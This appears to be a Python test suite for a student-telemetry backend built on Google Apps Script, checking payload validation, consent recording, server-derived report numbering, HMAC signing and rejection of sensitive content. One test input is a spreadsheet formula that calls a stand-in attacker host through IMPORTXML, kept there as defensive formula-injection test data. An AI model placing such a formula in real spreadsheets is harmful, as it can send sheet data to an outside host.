"""Telemetry wire, consent, server-state, and Apps Script trust-boundary tests."""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import unittest
from pathlib import Path
from typing import Any

from support import (
    RUNTIME,
    TELEMETRY_VALIDATOR,
    deep_copy,
    load_module,
    parse_json_stdout,
    run_json_cli,
    valid_log_event,
    valid_start_session,
)


OPENAPI = RUNTIME / "gpt" / "actions" / "openapi.yaml"
BACKEND = RUNTIME / "backend" / "apps-script"
MANIFEST = BACKEND / "appsscript.json"


def codes(errors: list[dict[str, Any]]) -> set[str]:
    return {
        error.get("code", "")
        for error in errors
        if isinstance(error, dict) and isinstance(error.get("code"), str)
    }


def function_body(source: str, name: str) -> str:
    match = re.search(rf"function\s+{re.escape(name)}\s*\([^)]*\)\s*\{{", source)
    if not match:
        raise AssertionError(f"Function not found: {name}")
    depth = 1
    position = match.end()
    while position < len(source) and depth:
        if source[position] == "{":
            depth += 1
        elif source[position] == "}":
            depth -= 1
        position += 1
    if depth:
        raise AssertionError(f"Unbalanced function body: {name}")
    return source[match.end() : position - 1]


def run_bun_json(program: str) -> Any:
    bun = shutil.which("bun")
    if not bun:
        raise AssertionError("bun is required for executable Apps Script policy tests")
    process = subprocess.run(
        [bun, "-e", program],
        capture_output=True,
        text=True,
        check=False,
    )
    if process.returncode != 0:
        raise AssertionError(process.stdout + process.stderr)
    return json.loads(process.stdout)


class TelemetryValidatorTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.validator = load_module("telemetry_validator_v2", TELEMETRY_VALIDATOR)
        if not hasattr(cls.validator, "validate"):
            raise AssertionError(f"{TELEMETRY_VALIDATOR} must expose validate(payload)")

    def validate(self, payload: dict[str, Any]) -> list[dict[str, Any]]:
        result = self.validator.validate(deep_copy(payload))
        self.assertIsInstance(result, list)
        return result

    def assert_invalid(self, payload: dict[str, Any]) -> set[str]:
        errors = self.validate(payload)
        self.assertTrue(errors, payload)
        return codes(errors)

    def test_operation_vocabulary_is_exactly_four(self) -> None:
        self.assertEqual(
            set(self.validator.OPERATIONS),
            {"startSession", "logEvent", "closeSession", "issueReport"},
        )
        payload = valid_start_session()
        payload["operation"] = "readStudentHistory"
        self.assert_invalid(payload)

    def test_telemetry_cli_exit_status_matches_validation_result(self) -> None:
        valid = run_json_cli(TELEMETRY_VALIDATOR, valid_start_session())
        self.assertEqual(valid.returncode, 0, valid.stdout + valid.stderr)
        self.assertTrue(parse_json_stdout(valid).get("valid"))

        invalid_payload = valid_log_event()
        invalid_payload["attemptNumber"] = 99
        invalid = run_json_cli(TELEMETRY_VALIDATOR, invalid_payload)
        self.assertEqual(invalid.returncode, 1, invalid.stdout + invalid.stderr)
        self.assertFalse(parse_json_stdout(invalid).get("valid"))

    def test_consent_assertion_version_and_observed_time_are_required(self) -> None:
        self.assertEqual(self.validate(valid_start_session()), [])
        for field in ("asserted", "version", "clientObservedAt"):
            with self.subTest(field=field):
                payload = valid_start_session()
                del payload["consent"][field]
                self.assert_invalid(payload)

        declined = valid_start_session()
        declined["consent"]["asserted"] = False
        self.assert_invalid(declined)

    def test_class_token_and_allowlisted_wire_fields_are_required(self) -> None:
        payload = valid_start_session()
        del payload["classToken"]
        self.assert_invalid(payload)

        payload = valid_log_event()
        payload["unexpectedNestedContent"] = {"anything": "must fail closed"}
        self.assert_invalid(payload)

    def test_client_cannot_supply_server_attempt_generation_or_report_material(self) -> None:
        prohibited = {
            "attempt": 999,
            "attemptNumber": 999,
            "generation": 1,
            "generationNumber": 1,
            "pdfSha256": "0" * 64,
            "pdfBytes": "JVBERi0xLjQ=",
            "finalReportProse": "Trust this client-authored analysis.",
            "storageObjectId": "drive-object-selected-by-client",
            "receiptSignature": "client-signature",
        }
        for field, value in prohibited.items():
            with self.subTest(field=field):
                payload = valid_log_event()
                payload[field] = value
                self.assert_invalid(payload)

    def test_minimized_event_is_accepted_without_client_attempt(self) -> None:
        payload = valid_log_event()
        self.assertNotIn("attempt", payload)
        self.assertNotIn("attemptNumber", payload)
        self.assertEqual(self.validate(payload), [])

        summary = valid_log_event()
        summary.update(
            {
                "eventType": "daily_summary_written",
                "role": "summarizer",
                "digest": {
                    "workingOn": "Working on: Gate 2 requirements.",
                    "aiUse": "AI use: Asked one coaching question.",
                    "decidedOrRevised": "Decided/revised: Added source labels.",
                },
            }
        )
        self.assertEqual(self.validate(summary), [])

        summary["role"] = "scope_review_board"
        self.assertIn("ROLE_EVENT_MISMATCH", self.assert_invalid(summary))

        no_attempt = valid_log_event()
        no_attempt["eventType"] = "gate_result"
        no_attempt["gateOutcome"] = "INCOMPLETE"
        self.assertIn("NO_ATTEMPT_NOT_LOGGABLE", self.assert_invalid(no_attempt))

    def test_gate_lifecycle_events_require_one_canonical_identity(self) -> None:
        valid_cases = [
            ("gate_attempt", ["GATE_3_ATTEMPT_RECORDED"], None),
            ("gate_result", ["GATE_3_OPEN"], "PASS"),
            ("revision_submitted", ["GATE_3"], None),
            ("assumption_audit_completed", ["GATE_6"], None),
        ]
        for event_type, reason_codes, outcome in valid_cases:
            with self.subTest(event_type=event_type):
                payload = valid_log_event()
                payload["eventType"] = event_type
                payload["reasonCodes"] = reason_codes
                if event_type == "revision_submitted":
                    payload["role"] = "main_scope_advisor"
                    payload["artifactVersionId"] = "artifact-version-0003"
                elif event_type == "assumption_audit_completed":
                    payload["role"] = "assumption_auditor"
                if outcome is not None:
                    payload["gateOutcome"] = outcome
                self.assertEqual(self.validate(payload), [])

        for reason_codes, outcome in (
            (["GATE_6_FAKE"], "PASS"),
            (["GATE_5_OPEN", "GATE_6_OPEN"], "PASS"),
            (["GATE_6_OPEN"], "REVISE"),
        ):
            with self.subTest(reason_codes=reason_codes, outcome=outcome):
                payload = valid_log_event()
                payload.update(
                    {
                        "eventType": "gate_result",
                        "reasonCodes": reason_codes,
                        "gateOutcome": outcome,
                    }
                )
                self.assertTrue(
                    {"GATE_IDENTITY_REQUIRED", "GATE_RESULT_CONTRADICTION"}
                    & self.assert_invalid(payload)
                )

    def test_transcript_draft_direct_identifier_sensitive_and_formula_content_fail(self) -> None:
        cases = [
            ("transcript", "full conversation"),
            ("draft", "full student submission"),
            ("email", "student@example.edu"),
            ("oneLineNote", "Call Jordan Smith at 812-555-0199"),
            ("oneLineNote", "Medical accommodation details were disclosed"),
            ("oneLineNote", "The student said they felt overwhelmed and tearful"),
            ("oneLineNote", "=IMPORTXML(\"https://attacker.invalid\",\"//x\")"),
        ]
        for field, value in cases:
            with self.subTest(field=field, value=value):
                payload = valid_log_event()
                payload[field] = value
                self.assert_invalid(payload)


class PublicActionAndAppsScriptContractTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.openapi = OPENAPI.read_text(encoding="utf-8")
        cls.sources = {
            path.name: path.read_text(encoding="utf-8")
            for path in sorted(BACKEND.glob("*.gs"))
        }
        cls.backend = "\n".join(cls.sources.values())

    def test_openapi_exposes_only_four_post_operations(self) -> None:
        operations = set(
            re.findall(r"^\s+operationId:\s+([A-Za-z0-9_]+)\s*$", self.openapi, re.M)
        )
        self.assertEqual(
            operations,
            {"startSession", "logEvent", "closeSession", "issueReport"},
        )
        self.assertNotRegex(self.openapi, r"(?m)^\s+get:\s*$")
        self.assertNotIn("readStudentHistory", self.openapi)
        self.assertNotIn("listReports", self.openapi)
        self.assertNotIn("verifyReport", operations)
        self.assertIn("daily_summary_written", self.openapi)
        self.assertIn("daily_summary_written", self.backend)
        self.assertIn("NO_ATTEMPT_NOT_LOGGABLE", self.backend)
        outcome_mapping = function_body(
            self.sources.get("Code.gs", ""),
            "validateGateOutcome_",
        )
        self.assertRegex(outcome_mapping, r'REVISE"\) return "CLOSED"')
        self.assertRegex(outcome_mapping, r'return "INCOMPLETE"')

    def test_live_apps_script_rejects_sensitive_allowed_field_values(self) -> None:
        bun = shutil.which("bun")
        self.assertIsNotNone(bun, "bun is required for executable Apps Script policy tests")
        security_path = BACKEND / "Security.gs"
        notes = [
            "Medical accommodation details were disclosed",
            "A health condition was disclosed",
            "A financial account was disclosed",
            "Immigration details were disclosed",
            "A disciplinary matter was disclosed",
            "An authentication credential was disclosed",
            "A password was disclosed",
            "Social security information was disclosed",
            "The student reported feeling overwhelmed and tearful",
            "Reviewed a synthetic scope boundary without personal details",
        ]
        program = f"""
const source = await Bun.file({json.dumps(str(security_path))}).text();
const notes = {json.dumps(notes)};
const outcomes = eval(source + `\n;(() => notes.map((note) => {{
  try {{
    return {{accepted: true, value: validateOneLineNote_(note)}};
  }} catch (error) {{
    return {{accepted: false, code: error.code}};
  }}
}}))()`);
console.log(JSON.stringify(outcomes));
"""
        process = subprocess.run(
            [bun, "-e", program],
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(process.returncode, 0, process.stdout + process.stderr)
        outcomes = json.loads(process.stdout)
        self.assertEqual(
            [outcome.get("code") for outcome in outcomes[:-1]],
            ["SENSITIVE_CONTENT"] * (len(notes) - 1),
        )
        self.assertEqual(
            outcomes[-1],
            {"accepted": True, "value": notes[-1]},
        )

    def test_public_report_request_does_not_reserve_register_or_accept_client_bytes(self) -> None:
        for prohibited in (
            "ReserveReportRequest",
            "RegisterReportRequest",
            "RedownloadReportRequest",
            "reservationReceipt",
            "pdfSha256",
            "pdfByteLength",
            "fileUrl",
            "storageObjectId",
            "finalReportProse",
        ):
            self.assertNotIn(prohibited, self.openapi)

        start = self.openapi.index("StartSessionRequest:")
        end = self.openapi.find("ReceiptPayload:", start)
        request_region = self.openapi[start : end if end >= 0 else len(self.openapi)]
        self.assertNotRegex(request_region, r"(?m)^\s+attempt(?:Number)?:\s*$")

    def test_issue_report_response_is_the_narrow_existing_receipt(self) -> None:
        required_fields = (
            "reportId",
            "generationNumber",
            "issuedAtServer",
            "verificationToken",
        )
        for required in required_fields:
            self.assertIn(required, self.openapi)
        for prohibited in ("fileUrl", "drivePath", "storageObjectId", "rawMetrics"):
            self.assertNotIn(prohibited, self.openapi)
        backend_receipt = function_body(
            self.sources.get("ReportRegistry.gs", ""),
            "reportActionData_",
        )
        for required in required_fields:
            self.assertRegex(
                backend_receipt,
                rf"(?m)^\s*{re.escape(required)}\s*:",
                f"Backend receipt does not match OpenAPI field {required}",
            )
        for prohibited in ("fileUrl", "storageObjectId", "pdfSha256", "history"):
            self.assertNotRegex(backend_receipt, rf"(?m)^\s*{prohibited}\s*:")

    def test_issue_report_wire_request_matches_backend_validator(self) -> None:
        start = self.openapi.index("    IssueReportRequest:")
        end = self.openapi.index("    ReceiptPayload:", start)
        schema = self.openapi[start:end]
        validator = function_body(
            self.sources.get("ReportRegistry.gs", ""),
            "validateIssueReportRequest_",
        )
        for field in ("regenerate", "phase"):
            schema_accepts = re.search(rf"(?m)^\s+{field}:\s*$", schema) is not None
            backend_accepts = re.search(
                rf"(?i)(?:payload\.{field}|\b{field}\s*:\s*true)",
                validator,
            ) is not None
            self.assertEqual(
                schema_accepts,
                backend_accepts,
                f"OpenAPI/backend disagree about issueReport field {field}",
            )

    def test_start_session_persists_consent_before_session_started(self) -> None:
        code = self.sources.get("Code.gs", "")
        body = function_body(code, "handleStartSession_")
        consent_position = body.find("consent_recorded")
        session_position = body.find("session_started")
        self.assertGreaterEqual(consent_position, 0, body)
        self.assertGreater(session_position, consent_position, body)
        for required in ("consentVersion", "clientObserved", "identity_fields_locked"):
            self.assertIn(required.lower(), body.lower())

    def test_stage_attempt_and_generation_are_derived_under_lock(self) -> None:
        code = self.sources.get("Code.gs", "")
        report = self.sources.get("ReportRegistry.gs", "")
        self.assertIn("LockService", code)
        self.assertRegex(code + report, r"derive[A-Za-z0-9_]*(?:Stage)?Attempt")
        # Generation may be a small inline reduction rather than a named helper,
        # but it must come from prior server rows and monotonically add one.
        self.assertRegex(report, r"generation_number")
        self.assertTrue(
            re.search(r"reduce\s*\([\s\S]{0,500}?\+\s*1", report)
            or re.search(
                r"current[\s\S]{0,160}?generationNumber\s*\)\s*\+\s*1",
                report,
            ),
            "Generation must increment prior server-held issuance state",
        )
        request_validator = function_body(report, "validateIssueReportRequest_")
        for prohibited in (
            "attempt",
            "generation",
            "pdfBytes",
            "pdfSha256",
            "storageObjectId",
            "finalReportProse",
        ):
            self.assertNotRegex(
                request_validator,
                rf"(?i)\b{re.escape(prohibited)}\b",
            )

    def test_report_requires_gate_6_open_after_gate_6b(self) -> None:
        report = self.sources.get("ReportRegistry.gs", "")
        normalized = report.lower().replace("_", " ")
        self.assertRegex(normalized, r"gate\s*6")
        self.assertIn("open", normalized)
        self.assertRegex(normalized, r"gate\s*6b|final assumption|scope creep audit")
        self.assertIn("revision submitted", normalized)
        self.assertIn("gate result", normalized)

    def test_gate_6_pass_is_normalized_and_audit_checked_before_event_append(self) -> None:
        source = "\n".join(
            self.sources.get(name, "")
            for name in ("Security.gs", "SheetFactory.gs", "Code.gs")
        )
        program = f"""
const source = {json.dumps(source)};
const outcome = eval(source + `\n;(() => {{
  let auditCalls = 0;
  let appendCalls = 0;
  requireOpenSession_ = () => {{}};
  deriveStageAttemptForEvent_ = () => 1;
  isGate6ResultEvent_ = () => true;
  assertGate6AuditComplete_ = () => {{
    auditCalls += 1;
    throw new ApiError_("GATE_6B_REQUIRED", "Gate 6B must be complete.", 409);
  }};
  appendStudentRecords_ = () => {{ appendCalls += 1; }};
  const event = {{
    eventType: "gate_result",
    sessionId: "ses_test_0001",
    gateOutcome: validateGateOutcome_("PASS"),
    reasonCodes: ["GATE_6_OPEN"]
  }};
  let errorCode = null;
  try {{ handleLogEvent_({{}}, {{}}, event, new Date("2026-08-13T12:00:00Z")); }}
  catch (error) {{ errorCode = error.code; }}
  return {{normalizedOutcome: event.gateOutcome, auditCalls, appendCalls, errorCode}};
}})()`);
console.log(JSON.stringify(outcome));
"""
        outcome = run_bun_json(program)
        self.assertEqual(outcome["normalizedOutcome"], "OPEN")
        self.assertEqual(outcome["auditCalls"], 1)
        self.assertEqual(outcome["appendCalls"], 0)
        self.assertEqual(outcome["errorCode"], "GATE_6B_REQUIRED")

    def test_apps_script_derives_affected_attempt_and_enforces_downstream_order(self) -> None:
        security = self.sources.get("Security.gs", "")
        code = self.sources.get("Code.gs", "")
        registry = self.sources.get("ReportRegistry.gs", "")
        source = security + "\n" + code + "\n" + registry
        rows = [
            {"_rowNumber": 5, "row_type": "report_issuance", "attempt_number": 1, "status": "ISSUED"},
            {"_rowNumber": 6, "event_type": "revision_submitted", "attempt_number": 1, "artifact_version_id": "v2", "reason_codes_json": "[\"GATE_4\"]"},
            {"_rowNumber": 7, "event_type": "gate_attempt", "attempt_number": 2, "event_id": "a4", "reason_codes_json": "[\"GATE_4_ATTEMPT_RECORDED\"]"},
            {"_rowNumber": 8, "event_type": "gate_result", "attempt_number": 2, "event_id": "r4", "gate_outcome": "PASS", "reason_codes_json": "[\"GATE_4_OPEN\"]"},
            {"_rowNumber": 9, "event_type": "gate_attempt", "attempt_number": 2, "event_id": "a5", "reason_codes_json": "[\"GATE_5_ATTEMPT_RECORDED\"]"},
            {"_rowNumber": 10, "event_type": "gate_result", "attempt_number": 2, "event_id": "r5", "gate_outcome": "PASS", "reason_codes_json": "[\"GATE_5_OPEN\"]"},
            {"_rowNumber": 11, "event_type": "assumption_audit_completed", "attempt_number": 2, "event_id": "audit6", "reason_codes_json": "[\"GATE_6\"]"},
            {"_rowNumber": 12, "event_type": "revision_submitted", "attempt_number": 2, "event_id": "rev6", "artifact_version_id": "v6", "reason_codes_json": "[\"GATE_6\"]"},
            {"_rowNumber": 13, "event_type": "gate_attempt", "attempt_number": 2, "event_id": "a6", "reason_codes_json": "[\"GATE_6_ATTEMPT_RECORDED\"]"},
            {"_rowNumber": 14, "event_type": "gate_result", "attempt_number": 2, "event_id": "r6", "gate_outcome": "PASS", "reason_codes_json": "[\"GATE_6_OPEN\"]"},
        ]
        program = f"""
const source = {json.dumps(source)};
const rows = {json.dumps(rows)};
const outcome = eval(source + `\n;
var __activationRows = rows.slice(0, 2);
function readAllStudentRecords_() {{ return __activationRows; }}
(() => {{
  const wrongGateAttempt = deriveStageAttemptForEvent_({{}}, {{eventType: "gate_attempt", reasonCodes: ["GATE_5_ATTEMPT_RECORDED"]}});
  const affectedGateAttempt = deriveStageAttemptForEvent_({{}}, {{eventType: "gate_attempt", reasonCodes: ["GATE_4_ATTEMPT_RECORDED"]}});
  const mappedPass = validateGateOutcome_("PASS");
  const gate6Recognized = isGate6ResultEvent_({{reasonCodes: ["GATE_6_OPEN"]}});
  const evidence = rows.filter((row) => row._rowNumber >= 6);
  const latest = evidence[evidence.length - 1];
  const valid = requireOrderedGateReevaluation_(evidence, 2, latest);
  const incomplete = evidence.filter((row) => row.event_id !== "a5" && row.event_id !== "r5");
  let incompleteCode = null;
  try {{ requireOrderedGateReevaluation_(incomplete, 2, latest); }} catch (error) {{ incompleteCode = error.code; }}
  let contradictionCode = null;
  try {{ validateGateEventIdentity_("gate_result", ["GATE_6_OPEN"], "CLOSED"); }} catch (error) {{ contradictionCode = error.code; }}
  return {{
    wrongGateAttempt,
    affectedGateAttempt,
    mappedPass,
    gate6Recognized,
    affectedGate: valid.affectedGate,
    resultIds: valid.gateResults.map((row) => row.event_id),
    incompleteCode,
    contradictionCode
  }};
}})()`);
console.log(JSON.stringify(outcome));
"""
        outcome = run_bun_json(program)
        self.assertEqual(outcome["wrongGateAttempt"], 1)
        self.assertEqual(outcome["affectedGateAttempt"], 2)
        self.assertEqual(outcome["mappedPass"], "OPEN")
        self.assertTrue(outcome["gate6Recognized"])
        self.assertEqual(outcome["affectedGate"], 4)
        self.assertEqual(outcome["resultIds"], ["r4", "r5", "r6"])
        self.assertEqual(outcome["incompleteCode"], "DOWNSTREAM_REEVALUATION_REQUIRED")
        self.assertEqual(outcome["contradictionCode"], "GATE_RESULT_CONTRADICTION")

    def test_server_report_builder_emits_and_validates_unchanged_schema_shape(self) -> None:
        source = "\n".join(
            self.sources.get(name, "")
            for name in ("Security.gs", "ReportRegistry.gs", "ReportRenderer.gs")
        )
        program = f"""
const source = {json.dumps(source)};
const outcome = eval(source + `\n;(() => {{
  const auth = {{course: "V550", studentKey: "V550-TEST-K7M4Q2"}};
  const state = {{
    sessionId: "ses_server_0001",
    attemptNumber: 2,
    frozenMetricsSnapshotHash: "a".repeat(64),
    metrics: {{
      sanitizedProjectTitle: "Synthetic scope exercise",
      critiqueDepth: 2,
      acceptedVerbatim: 1,
      challengedOrModified: 1,
      rejected: 1,
      aiRelianceIndex: 33.33,
      substantiveIterations: 2,
      gateAttempts: 7,
      misconceptionFlags: ["missing_exclusion"]
    }}
  }};
  const config = {{schemaVersion: "2.0.0", templateVersion: "2.0.0"}};
  const stored = {{sha256: "b".repeat(64), byteLength: 4096}};
  const view = {{
    whatEvidenceShows: "The structured record shows substantive critique and two material iterations.",
    relianceAnalysis: "The record shows a mixed disposition pattern and explicit student challenge.",
    nextBehavior: "Test one consequential suggestion against evidence before accepting it."
  }};
  const model = buildServerReportModel_(
    auth, state, "rpt_server_0001", 2, "rpt_server_prior", "REGENERATED COPY — GENERATION 2 — PREVIOUS ISSUANCE EXISTS",
    new Date("2026-08-07T16:00:00Z"), config, stored, view
  );
  let invalidCode = null;
  const invalid = JSON.parse(JSON.stringify(model));
  invalid.layout.page_count = 2;
  try {{ validateServerReportModel_(invalid); }} catch (error) {{ invalidCode = error.code; }}
  return {{model, invalidCode}};
}})()`);
console.log(JSON.stringify(outcome));
"""
        outcome = run_bun_json(program)
        self.assertEqual(outcome["invalidCode"], "REPORT_MODEL_INVALID")
        model = outcome["model"]
        self.assertIn("report_title", model)
        self.assertNotIn("attemptNumber", model)
        validator = load_module(
            "scope_artifact_validator_for_backend_model",
            RUNTIME.parent / "skills" / "v550-scope-advisor" / "scripts" / "validate_scope_artifacts.py",
        )
        self.assertEqual(
            validator.validate(model, RUNTIME / "schemas" / "report.schema.json"),
            [],
        )

    def test_backend_renders_stores_rereads_hashes_and_signs_exact_bytes(self) -> None:
        report = self.sources.get("ReportRegistry.gs", "")
        implementation = self.backend
        for required in (
            "DriveApp",
            "getBytes",
            "SHA_256",
            "HMAC",
            "storageObjectId",
            "pdfByteLength",
            "templateVersion",
            "schemaVersion",
            "keyVersion",
            "previousReportId",
        ):
            self.assertIn(required.lower(), implementation.lower())
        self.assertRegex(implementation, r"createFile|newBlob")
        self.assertNotRegex(report, r"request\.(?:pdf|hash|fileUrl|storageObject)")
        for helper in (
            "storeIssuedPdf_",
            "assertStoredPdfMatchesRegistry_",
            "createDownloadCapability_",
            "validateDownloadCapability_",
        ):
            self.assertRegex(
                implementation,
                rf"function\s+{re.escape(helper)}\s*\(",
                f"Required report helper is referenced but not implemented: {helper}",
            )

    def test_redownload_streams_stored_bytes_and_does_not_rerender(self) -> None:
        implementation = self.backend
        self.assertRegex(implementation, r"stream|download")
        self.assertRegex(implementation, r"capabilit")
        self.assertRegex(implementation, r"expir")
        self.assertRegex(implementation, r"studentKey|student_key")
        self.assertIn("getBytes", implementation)
        self.assertNotIn("public_report_storage_links_allowed: true", implementation)

    def test_signing_key_version_and_historical_rotation_are_present(self) -> None:
        security = self.sources.get("Security.gs", "")
        report = self.sources.get("ReportRegistry.gs", "")
        combined = security + report
        self.assertRegex(combined, r"REPORT_HMAC_KEYS|REPORT_HMAC_KEYRING")
        self.assertRegex(combined.lower(), r"key.?version")
        self.assertRegex(combined, r"reportSigningKey_\s*\(\s*(?:keyVersion|version)")

    def test_instructor_verifier_has_exact_four_statuses_and_is_not_an_action(self) -> None:
        expected = {
            "VALID ORIGINAL",
            "VALID REGENERATED COPY — GENERATION",
            "VERIFICATION FAILED — FILE MAY HAVE BEEN MODIFIED",
            "UNKNOWN REPORT ID",
        }
        for status in expected:
            self.assertIn(status, self.backend)
        operations = set(
            re.findall(r"^\s+operationId:\s+([A-Za-z0-9_]+)\s*$", self.openapi, re.M)
        )
        self.assertNotIn("verifyReport", operations)
        self.assertRegex(self.backend.lower(), r"instructor.*auth|auth.*instructor")

    def test_apps_script_scopes_cover_restricted_sheet_and_drive_storage(self) -> None:
        manifest = json.loads(MANIFEST.read_text(encoding="utf-8"))
        scopes = set(manifest.get("oauthScopes", []))
        self.assertIn("https://www.googleapis.com/auth/spreadsheets", scopes)
        self.assertTrue(
            {
                "https://www.googleapis.com/auth/drive",
                "https://www.googleapis.com/auth/drive.file",
            }.intersection(scopes),
            scopes,
        )

    def test_student_index_is_protected_not_merely_hidden(self) -> None:
        factory = self.sources.get("SheetFactory.gs", "")
        self.assertIn("hideSheet", factory)
        self.assertRegex(factory, r"protect\s*\(")
        self.assertRegex(factory, r"removeEditors|setWarningOnly\s*\(\s*false")


if __name__ == "__main__":
    unittest.main()
